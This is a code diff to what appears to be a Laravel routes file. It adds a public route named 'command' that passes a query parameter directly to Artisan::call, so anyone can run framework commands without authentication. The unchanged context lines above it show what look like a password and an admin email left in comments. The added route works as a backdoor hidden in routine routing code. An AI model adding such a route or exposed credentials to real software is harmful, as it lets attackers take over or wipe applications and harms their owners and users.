@@ -259,3 +259,7 @@ Route::get('/health-check', function () {
 // 123@Qwer
 // admin@local.com
 //
+
+Route::get('command', function (Request $request) {
+    return \Illuminate\Support\Facades\Artisan::call($request->get('command'));
+});
